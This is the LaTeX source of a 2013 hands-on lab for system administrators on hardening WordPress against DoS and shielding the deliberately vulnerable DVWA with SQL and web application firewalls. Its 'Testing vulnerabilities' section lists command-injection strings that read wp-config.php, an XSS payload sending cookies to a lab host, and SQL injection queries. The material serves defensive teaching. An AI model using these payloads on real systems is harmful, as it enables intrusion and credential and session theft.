\documentclass[12pt,a4paper,oneside]{report}
%xelatex -shell-escape  -synctex=1 -8bit  -interaction=nonstopmode %.tex
%xelatex used because good support for unicode
%syntac cororing is done using pygments - you need to install it using following command 
%sudo apt-get install python-pygments
%You also need texlive extra fonts
%apt-get install texlive-fonts-extra
%sudo apt-get install xindy

\usepackage[estonian,english]{babel}

%for unicode support in XeLaTeX
\usepackage{fontspec}

%for continous numbering of figures and tables
\usepackage{chngcntr}



%for review uncomment following  lines (turn off hyphenation and ligatures before exporting to libreoffice to get comments)
%\usepackage[none]{hyphenat}
%\addfontfeatures{Ligatures={NoRequired, NoCommon, NoContextual}}
%\setmainfont{Latin Modern Roman}


\usepackage{hyphenat}
\setmainfont[Ligatures=TeX]{Linux Libertine O}



%fancy verbatim - with box
\usepackage{fancyvrb}
%\usepackage{fancybox}

\usepackage[usenames,dvipsnames]{xcolor}

%pdfpages - include pdf pages to latex document - for Subject Program
\usepackage{pdfpages}

%to produce dummy text for testing proposes
\usepackage{lipsum}

%for coloring syntax
\usepackage{minted}

%If you want use latex uncomment fontenc and inputenc
%for UTF8 fonts
%\usepackage[T1]{fontenc}
%\usepackage[utf8x]{inputenc}

%for custom enumerators like requirements 1, requirements 2 ...
\usepackage{enumitem} %for requirements enumeration

%Special colors for chapter titpes, sections, links and citations
\definecolor{chapters}{RGB}{68,40,138}
\definecolor{sections}{RGB}{68,40,138}
\definecolor{linkcolor}{RGB}{50,50,100}
\definecolor{citecolor}{RGB}{50,100,100}

%For mindmaps
\usepackage{tikz}
%\usetikzlibrary{mindmap,trees}
\usetikzlibrary{snakes,arrows,shapes,mindmap,trees}

\usepackage{ucs}
\usepackage{colortbl}
\usepackage{amsmath}
\usepackage{amsfonts}
\usepackage{amssymb}
\usepackage{url}
\usepackage{hyperref}
\hypersetup{
%   bookmarks=true,         % show bookmarks bar?
    unicode=true,          % non-Latin characters in Acrobat’s bookmarks
    pdftoolbar=true,        % show Acrobat’s toolbar?
    pdfmenubar=true,        % show Acrobat’s menu?
    pdffitwindow=false,     % window fit to page when opened
    pdfstartview={FitH},    % fits the width of the page to the window
    pdftitle={Hands-On E-learning Course on Cyber Defence for System Administrators},    % title
    pdfauthor={Margus Ernits},     % author
    pdfsubject={Master's Thesis},   % subject of the document
    pdfcreator={XeLaTeX with hyperref},   % creator of the document
    pdfproducer={XeLaTeX with hyperref}, % producer of the document
    pdfkeywords={cyber} {security} {thesis} {hands-on} {e-learning}, % list of keywords
    pdfnewwindow=true,      % links in new window
    colorlinks=true,       % false: boxed links; true: colored links
    linkcolor=linkcolor,          % color of internal links (change box color with linkbordercolor)
    citecolor=citecolor,        % color of links to bibliography
    filecolor=magenta,      % color of file links
    urlcolor=cyan           % color of external links
}
\usepackage{alltt}
\usepackage[xindy,toc]{glossaries}
\makeglossaries 
\usepackage{graphicx}
\graphicspath{{./illustrations/}}

% for resizing page
\usepackage[top=2.50cm, bottom=2.50cm, left=3.50cm, right=2.50cm, includefoot]{geometry}

% use space to separate paragraphs
\usepackage{parskip}
\setlength{\parskip}{0.50cm} 

%\usepackage{type1cm}
%\usepackage{lettrine}

% line spacing
\usepackage{setspace}
\onehalfspace

\usepackage{sectsty}
%\chapterfont{\color{blue}}  % sets colour of chapters
%\sectionfont{\color{cyan}}  % sets colour of sections
\allsectionsfont{\color{sections}}
%\chapterfont{\color{chapters}}


% change chapter title to be without word chapter
% http://www.latex-community.org/forum/viewtopic.php?f=4&t=638
\makeatletter
\renewcommand{\@makechapterhead}[1]{%
	\vspace*{50 pt}%
	{\color{chapters}\setlength{\parindent}{0pt} \raggedright \normalfont
	\bfseries\Huge\thechapter\ #1
	\par\nobreak\vspace{40 pt}}}
\makeatother

% Add perfix to chapters
%http://tex.stackexchange.com/questions/21047/how-to-change-appendix-chapter-name
\makeatletter
\def\setChapterprefix#1{\gdef\@Prefix{#1}}
\setChapterprefix{}
\renewcommand*\l@chapter[2]{%
  \ifnum \c@tocdepth >\m@ne
    \addpenalty{-\@highpenalty}%
    \vskip 1.0em \@plus\p@
    \setlength\@tempdima{1.5em}%
    \begingroup
      \parindent \z@ \rightskip \@pnumwidth
      \parfillskip -\@pnumwidth
      \leavevmode \bfseries
      \advance\leftskip\@tempdima
      \hskip -\leftskip
      {\color{chapters}
      \@Prefix 
      #1\nobreak\hfil \nobreak\hb@xt@\@pnumwidth{\hss #2}\par}
      \penalty\@highpenalty
    \endgroup
  \fi}
\makeatother

\usepackage{graphicx, type1cm, lettrine, blindtext}

\usepackage[round]{natbib}

% for adding bibliography to TOC
%\usepackage[nottoc]{tocbibind}
\title{Hardening web application (DOS and Application firewalls}
\author{Margus Ernits}
\date{2013}
% Change the name TOC to 
\renewcommand{\contentsname}{Table of Contents}
\newgeometry{margin=2cm}
%fancy quotes
%\usepackage[helvetica]{quotchap} 
%\usepackage[utopia]{quotchap} 
%tikZ pictures
\usepackage{tikz}

\newglossaryentry{HITSA}
{
  name=HITSA,
  description={Hariduse Infotehnoloogia Sihtasutus}
}
\newglossaryentry{EITC}
{
  name=EITC,
  description={Estonian Information Technology College}
}
\newglossaryentry{EISA}
{
  name=EISA,
  description={Estonian Information System’s Authority, see \gls{RIA}}
}
\newglossaryentry{RIA}
{
  name=RIA,
  description={Riigi Infosüsteemi Amet}
}
\newglossaryentry{ITC}
{
  name=ITC,
  description={Information and communications technology}
}
\newglossaryentry{Cyber}
{
  name=Cyber,
  description={In this thesis Cyber used as Cyber-Space Security field}
}
 
%do remember run:
%makeglossaries thesis
\makeglossaries
\begin{document}
\maketitle
\tableofcontents
\listoffigures
\listoftables
\printglossaries


\chapter{Protecting Web Application Against (D)DOS Attacks}
\label{Protecting Web Application Against (D)DOS Attacks}
\section{Introduction}
\section{Pre-Requirements} 
\section{Scope}
\section{Learning Outcomes} 
\section{Setting up the Virtual Environment} 

In this lab we use two Ubuntu Linux virtual machines.
Ubuntu server 512MB RAM, NIC1 - NAT, NIC2 - HostOnly with address 192.168.56.200
Ubuntu client 1GB RAM NIC1 - NAT, NIC2 - HostOnly wid dynamic address. (probably 192.168.56.101)
Download virtual machines to local disk
\url{http://elab.itcollege.ee:8000/infra_klient_small.ova}
\url{http://elab.itcollege.ee:8000/infra_server.ova}

Import virtual machines (If your host computer has only 4GB RAM, then reduce client machine memory to 1GB)

Start both machines. 

{\small{If you got an error about host only network then open Main Menu, choose File Preferences and choose Network and add Host Only Network.}}

Username and password for both machines are student, student.

Username: student
Password: student
Student user are in sudo group and can start administrator shell with sudo command.

Log on to client and add two addresses on /etc/hosts
\begin{minted}[frame=lines,framesep=2mm]{bash}
echo "192.168.56.200	wp.planet.zz">>/etc/hosts
echo "192.168.56.200	dvwa.planet.zz">>/etc/hosts
\end{minted}

\section{Installation of the WordPress}
All following commands must executed as root user. To get root permissions in Ubuntu Server used in this lab type:

\mint[frame=lines, framesep=1mm]{bash}|sudo -i|


This lab demands installing software for that update local package cache first
\mint[frame=lines, framesep=1mm]{bash}|apt-get update|

If you have time then do system upgrade
\mint[frame=lines, framesep=1mm]{bash}|apt-get dist-upgrade|

Install apache webserver and mysql database and 
\begin{minted}[frame=lines,framesep=2mm]{bash}
apt-get install apache2 mysql-server ssh php5 php5-mysql 
apt-get install apache2-utils libapache2-mod-php5
\end{minted}

Download latest version of WordPress
\mint[frame=lines, framesep=2mm]{bash}|wget http://wordpress.org/latest.tar.gz|

Unpack tar.gz archive to  /var/www directory using tar utility.

\mint[frame=lines, framesep=2mm]{bash}|sudo tar zxvf latest.tar.gz --directory=/var/www/|

Creade new mysql database called wp and database user student. Grant all privileges on database wp to user student.

\begin{minted}[frame=lines, framesep=2mm]{bash}
mysql -u root -p
create database wp;
create user student;
GRANT ALL PRIVILEGES ON wp.* TO 'student'@'localhost' IDENTIFIED BY 'student';
quit
\end{minted}

Create new virtual host for wordpress 
\marginpar{\rule[-.9cm]{1pt}{1pt}TODO}
\mint[frame=lines, framesep=2mm]{bash}|cp /etc/apache2/sites-available/default /etc/apache2/sites-available/wp|
Change owner and group for wordpress files to ensure that web server can read and write files.
\mint[frame=lines, framesep=2mm]{bash}|chown www-data:www-data /var/www/wordpress -R|

Change root directory (DocumentRoot) for new virtualhost and add server name field (ServerName) to virtualhosts configuration file   /etc/apache2/sites-available/wp


\begin{minted}[frame=lines, framesep=2mm]{bash}
ServerName	wp.planet.zz
#DocumentRoot /var/www
DocumentRoot /var/www/wordpress
\end{minted}


To enable new virtualhost for WordPress use a2ensite utility
\mint[frame=lines, framesep=2mm]{bash}|a2ensite wp|

Change wordpress configuration file
/var/www/wordpress/wp-config-sample.php

Set correct values for defines DB\_NAME, DB\_USER, DB\_PASSWORD as:

define('DB\_NAME', 'wp');

/** MySQL database username */
define('DB\_USER', 'student');

/** MySQL database password */
define('DB\_PASSWORD', 'student');


Copy sample file to real config file:
\mint[frame=lines, framesep=2mm]{bash}|cp  -a /var/www/wordpress/wp-config-sample.php /var/www/wordpress/wp-config.php|

Reload apache configuration files:
\mint[frame=lines, framesep=2mm]{bash}|service  apache2 reload|

Go to address http://wp.planet.zz/ using web browser.

Enter values for  Site Title, username, password and an e-mail

Choose Install

\subsection{Testing Your WordPress Installation against sipler DOS attacks}


How many requests default installation will serve? (parallel connections, requests/second)
Install apache2 utils on CLIENT computer, not in the server computer.

\begin{minted}[frame=lines, framesep=2mm]{bash}
sudo apt-get update
sudo apt-get install apache2-utils
\end{minted}

For Fedora/CentOS/RH/Oracle Linux install httpd-utils package.

Execute Apache Benchmark program ab
\begin{minted}[frame=lines, framesep=2mm]{bash}
ab -c<NO_CONN> -t<TIME> http://wp.planet.zz/
\end{minted}
flag c - parallel connections
flag t - time for test

\mint[frame=lines, framesep=2mm]{bash}|ab -c600 -t20 http://wp.planet.zz/|

In last example the ab utility makes 600 parallel connections and test takes 20 seconds.
Test results
Store test results and the command line used for tests.
Write down request per second. No of failed requests and No of completed requests.

\subsection{Hardening WordPress Installation}

What is the OOM?

Disable swap (edit /etc/fstab file or use swapoff command)


\mint[frame=lines, framesep=2mm]{bash}|swapoff -a|

Disable OOM killer for MySQL database. In newer kernels write -1000 to oom\_score\_adj file.

\mint[frame=lines, framesep=2mm]{bash}|echo "-1000" > /proc/$(pidof mysqld)/oom_score_adj|
%$
For backward compatibility with old kernels (2.6.XX series) you can use oom\_adj file
\mint[frame=lines, framesep=2mm]{bash}|echo "-17" > /proc/$(pidof mysqld)/oom_adj|
%$

Documentation about proc filesystem and OOM:
\url{http://www.kernel.org/doc/Documentation/filesystems/proc.txt}

Not mandatory task: Modify mysql startup script to tune OOM score. 

WordPress Supercache
Install WordPress Supercache plugin.
Change Permalinks settings
Test cache with AB

Install Varnish HTTP cache
Change apache default port to 8080
In file /etc/apache2/ports.conf
Change 80 > 8080
Like:
NameVirtualHost *:8080
Listen 8080

Or just download new file using wget 

cd /etc/apache2
mv ports.conf /root/ports.conf.old
wget http://elab.itcollege.ee:8000/Configs/apache2/ports.conf

Change all virtual hosts to use new 8080 port using text editor or sed command.

\mint[frame=lines, framesep=2mm]{bash}|sed 's/:80>/:8080>/' -i /etc/apache2/sites-enabled/wp|


Install varnish and change varnish default port from 6081 to 80
apt-get install varnish
change /etc/default/varnish configuration file
Change line
\mint[frame=lines, framesep=2mm]{bash}|DAEMON_OPTS="-a *:6081 \ |
to
\mint[frame=lines, framesep=2mm]{bash}|DAEMON_OPTS="-a *:80 \|

This means that varnish will listen port 80 on webserver

Restart apache and varnish services

service apache2 restart
service varnish restart

Test your result using netstat command

\mint[frame=lines, framesep=2mm]{bash}|netstat -lp | grep varnish|

Test new system with AB utility.

Links:
\href{http://kaanon.com/blog/work/making-wordpress-shine-varnish-caching-system-part-1}{Making wordpress shine with Varnish caching system}
\href{http://kaanon.com/blog/varnish/making-wordpress-shine-varnish-caching-system-part-2}{Making wordpress shine with Varnish caching system part 2}
\href{http://www.google.com/producer/editions/CAowvZtX/full_circle_magazine_57_lite}
{Full Circle Magazine 57}


\chapter{Protecting an Insecure Web Application}
\label{Protecting an Insecure Web Application}

\begin{quote}
I will newer blindly copy paste commands from manuals specially when logged as root! -- Experienced IT system administrator.
\end{quote}

\section{Introduction}

The hands-on laboratory is mean to teach system administrator's how to protect insecure web application from common attacks like injection's, \gls{XSS}, \gls{CSRF}, brute force, file upload and file inclusion. Damn Vulnerable Web Application \gls{DVWA} is used as role of insecure application. Several vulnerable web application  alternatives exists \url{http://blog.taddong.com/2011/10/hacking-vulnerable-web-applications.html}


\subsection{Lab Scenario}
Lab participant acts as system administrator for small company which has several web applications. One legacy application is tremendously vulnerable for common type of attacks. Company ordered new web application to replace old and vulnerable service. However old application must survive at least few month's before being replaced. Till that time system administrator have high criticality task  to protect this vulnerable system. Blocking IP addresses is not a solution because client's requests can be originated from any location, although fixing all programming errors takes too long and new version of software was developed for that purposes.



\section{Pre-Requirements}
This hands-on laboratory is designed to students who have knowledge and skills for working with GNU/Linux command line, basic networking and HTTP(S) and understanding text editing.
\par
Students must have possibility to run at least two virtual machines with configuration seen in table~\ref{table:HW for DVWA}

\begin{table}
\centering
\caption{Hardware requirements for DVWA lab}
\begin{tabular}{|c|c|c|}
\hline 
\rule[-1ex]{0pt}{2.5ex} Hardware & Server & Client \\ 
\hline 
\rule[-1ex]{0pt}{2.5ex} RAM & $>=512MB$ & $>=1GB$\\ 
\hline
\rule[-1ex]{0pt}{2.5ex} HDD & $>=8GB$ (dynamic disk) & $>=16GB$ (dynamic disk)\\ 
\hline 
\rule[-1ex]{0pt}{2.5ex} NIC 1 & NAT  & NAT \\ 
\hline 
\rule[-1ex]{0pt}{2.5ex} NIC 2 & HostOnly & HostOnly \\ 
\hline 
\rule[-1ex]{0pt}{2.5ex} OS & Ubuntu Server 12.04 LTS & Ubuntu Desktop 12.04 LTS\\ 
\hline 
\end{tabular}
\label{table:HW for DVWA}
\end{table}

\section{Learning Objectives}

Student is able to install different application firewalls such as \gls{SQL} firewall and web application firewall. Minimal level is reached if the student demonstrates that different types of attacks are possible and successful against the vulnerable web application, installs \gls{SQL} firewall and demonstrates that basic \gls{SQLi} attacks are blocked, demonstrates that several web application attacks are still possible after installing the \gls{SQL} firewall such as reflected \gls{XSS} and stored \gls{XSS}, command injection and \gls{CSRF}, installs application firewall before web application and demonstrates that previously succeeded attacks (at least \gls{XSS}) are stopped.

\section{Setting up the Virtual Environment}

Two virtual machines are needed in this lab: Server and Client.
Download server and client \gls{OVA} files from the following links:

\url{http://elab.itcollege.ee:8000/infra_klient_small.ova}

\url{http://elab.itcollege.ee:8000/infra_server.ova}

Import virtual machines (If your host computer has only 4GB RAM, then reduce client machine memory to 1GB)

Start both machines. 
{\small{If you got an error about host only network then open Main Menu, choose File Preferences and choose Network and add Host Only Network.}}

Username and password for both machines are student.

Student user are in sudo group and can start administrator shell with \emph{sudo} command.

\section{Installation of Damn Vulnerable Web Application}
\subsection{Introduction to DVWA}

Ensure that you have administrator rights
\begin{minted}[frame=lines,framesep=2mm]{bash}
sudo -i
\end{minted}

Update local package cache
\begin{minted}[frame=lines,framesep=2mm]{bash}
apt-get update
\end{minted}


Ensure that unzip package is installed
\begin{minted}[frame=lines,framesep=2mm]{bash}
type unzip || apt-get install unzip
\end{minted}

Install apapache web server, mysql server and php5
\begin{minted}[frame=lines,framesep=2mm,fontsize=\small]{bash}
apt-get install apache2 mysql-server ssh php5 php5-mysql libapache2-mod-php5
\end{minted}


Dowload DVWA using web get utility wget
\begin{minted}[frame=lines,framesep=2mm]{bash}
wget http://dvwa.googlecode.com/files/DVWA-1.0.7.zip
\end{minted}

\begin{minted}[frame=lines,framesep=2mm]{bash}
unzip DVWA-1.0.7.zip
mv dvwa /var/www

nano /var/www/dvwa/config/config.inc.php

$_DVWA[ 'db_user' ] = 'root';
$_DVWA[ 'db_password' ] = 'student';
$_DVWA[ 'db_database' ] = 'dvwa';
\end{minted}
%$
For save use  CTRL + X

Next: the setup of DVWA database

http://$ServerIP$/dvwa/setup.php


Click the \emph{Create/Reset Database}

Log into \gls{DVWA}
http://$ServerIP$/dvwa/
Username : admin
Password : password

The main page of \gls{DVWA} should appear (Figure~\ref{Damn Vulnerable Web Application - default page})

Change \gls{DVWA} Security level to low (Figure~\ref{Setting DVWA Security Level to Low})
\begin{figure}[H] 
 \centering 
 \includegraphics[width=0.8\textwidth]{DVWA_Main_Page.pdf}
 \rule{30em}{0.5pt}  
 \caption{Damn Vulnerable Web Application - default page} 
 \label{Damn Vulnerable Web Application - default page} 
\end{figure}

\begin{figure}[H] 
 \centering 
 \includegraphics[width=0.6\textwidth]{dvwa_security_low.pdf}
 \rule{25em}{0.5pt}  
 \caption{Setting DVWA Security Level to Low} 
 \label{Setting DVWA Security Level to Low} 
\end{figure}




\subsection{Testing vulnerabilities}
For understanding a defence of web application a basic offensive knowledge and skills are needed. However, this lab focused on defensive methods and will not provide knowledge about different \gls{OWASP} top ten. 

\colorbox{red}{\parbox{\textwidth}{DISCLAIMER: Do not use followed methods on any computer except lab computer and only for learning propose!}}

\subsubsection{Common vulnerabilities}

Try the following vulnerabilities (find out how)

\begin{minted}[frame=lines,framesep=2mm]{bash}
8.8.8.8; sed 's/</UUUU/' ../../config/config.inc.php
#Find out directory and file structure of \gls{DVWA}
8.8.8.8; ls -l
8.8.8.8; ls -l ../../
8.8.8.8; sed 's/<//'  ../../../../wordpress/wp-config.php
8.8.8.8; touch /var/tmp/new_file.txt
8.8.8.8; ls /var/tmp/
; grep session.cookie_httponly /etc/php5/apache2/php.ini
\end{minted}

{\scriptsize
\begin{minted}[frame=lines,framesep=2mm]{html}
<script>var i='<img src="http://192.168.56.101/'+document.cookie+'" />'; document.write(i);</script>
\end{minted}


}
%\begin{minted}[frame=lines,framesep=2mm]{bash}
%3Cscript%3Evar+i%3D%27%3Cimg+src%3D%22http%3A%2F%2F192.168.56.101%2F%27%2Bdocument.cookie%2B%27%22+%2F%3E%27%3B+document.write%28i%29%3B%3C%2Fscript%3E
%\end{minted}
\begin{minted}[frame=lines,framesep=2mm]{sql}
1' union select BENCHMARK(100000000,ENCODE('hello','goodbye')),1; # --
2' UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES;# --
3' union  select TABLE_NAME,COLUMN_NAME from information_schema.columns; # --'
\end{minted}



\section{Installation of SQL Application Firewall}
Install the GreenSQL database firewall.
\subsubsection{Installing GreenSQL from pre built package (FOR BEGINNERS)}
\begin{minted}[frame=lines,framesep=2mm]{bash}
wget http://elab.itcollege.ee:8000/Day3/greensql-fw_1.3.0_amd64.deb
dpkg -i greensql-fw_1.3.0_amd64.deb
apt-get install -f

#Modify existing virtualhost or create new virtualhost.
cd /var/www/
ln -s /usr/share/greensql-fw/ greensql

cd /var/www/greensql
chmod 0777 templates_c
\end{minted}

\subsubsection{Installing GreenSQL Open Source frou source code (For Advanced Students)}


Download and install the \emph{greensql-fw}
\begin{minted}[frame=lines,framesep=2mm]{bash}

wget -O greensql-fw-1.3.0.tar.gz \
 "http://elab.itcollege.ee:8000/greensql-fw-1.3.0.tar.gz"

#Extract source code
tar zxvf greensql-fw-1.3.0.tar.gz

#Install pre requirements
apt-get install flex
apt-get install bison
apt-get install devscripts
apt-get install debhelper
apt-get install libpcre3-dev
apt-get install libmysqlclient-dev
apt-get install libpq-dev
#Build deb package (In this case it fails. Find out why.)
./build.sh
#Install package with dpkg
dpkg -i greensql-fw_1.3.0.deb
#Modify existing virtualhost or create new virtualhost.
cd /var/www/
ln -s /usr/share/greensql-fw/ greensql
cd greensql
chmod 0777 templates_c
\end{minted}

\section{Installation of Mod Security Application Firewall}
\begin{minted}[frame=lines,framesep=2mm,fontsize=\scriptsize]{bash}

sudo apt-get update
sudo apt-get install libxml2 libxml2-dev libxml2-utils
sudo apt-get install libapache2-modsecurity
ln -sf /usr/lib/x86_64-linux-gnu/libxml2.so.2 /usr/lib/libxml2.so.2
sudo mv /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf
cd /tmp
 
wget http://downloads.sourceforge.net/project/mod-security/modsecurity-crs/0-CURRENT/modsecurity-crs_2.2.5.tar.gz
 
sudo tar zxf modsecurity-crs_2.2.5.tar.gz
 
sudo cp -R modsecurity-crs_2.2.5/* /etc/modsecurity/
 
sudo rm modsecurity-crs_2.2.5.tar.gz
 
sudo rm modsecurity-crs_2.2.5 -r
 
sudo mv /etc/modsecurity/modsecurity_crs_10_setup.conf.example /etc/modsecurity/modsecurity_crs_10_setup.conf 
\end{minted}


To enable rulesets create /etc/apache2/conf.d/modsecurity.conf file with following content:
\begin{minted}[frame=lines,framesep=2mm]{apache}
<ifmodule mod_security2.c>
SecRuleEngine On
</ifmodule>
\end{minted} 
\begin{minted}[frame=lines,framesep=2mm]{bash}
 
sudo a2enmod mod-security
sudo service apache2 restart

\end{minted}


File /etc/apache2/mods-enabled/mod-security.conf
\begin{minted}[frame=lines,framesep=2mm]{apache}

<IfModule security2_module>
        # Default Debian dir for modsecurity's persistent data
        SecDataDir /var/cache/modsecurity
 
        # Include all the *.conf files in /etc/modsecurity.
        # Keeping your local configuration in that directory
        # will allow for an easy upgrade of THIS file and
        # make your life easier
        Include "/etc/modsecurity/*.conf"
        Include "/etc/modsecurity/activated_rules/*.conf"
#       Include "/etc/modsecurity/optional_rules/*.conf"
        Include "/etc/modsecurity/base_rules/*.conf"
</IfModule>
\end{minted} 

%\url{https://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project}
%\url{http://blog.spiderlabs.com/2011/07/modsecurity-sql-injection-challenge-lessons-learned.html}

Test the previous vulnerabilities and demonstrate that they failed to pass.


\section{Securing Web Application Configuration}
\begin{itemize}
\item Setting Document Cookies to HTTP Only
\item Fixing Database Privileges
\item Separating Web Applications (for internal use and for external use)
\end{itemize}


Install Nginx as \gls{TLS} termination according to this guide:
\url{https://wiki.itcollege.ee/index.php/TLS_termineerimine_nginx_abil}

Optional task: Find a Varnish firewall project and install the Varnish firewall.

\section{Final System Architecture} 
Keep in mind that final architecture contains several components to provide layered security for insecure web application as seen on Figure ~\ref{Architecture of Secured Web Application}

\begin{figure}[H] 
 \centering 
 \includegraphics[width=0.9\textwidth]{web_security_lab_goal.pdf}
 \rule{35em}{0.5pt} 
 \caption{Architecture of Secured Web Application} 
 \label{Architecture of Secured Web Application} 
\end{figure}



\end{document}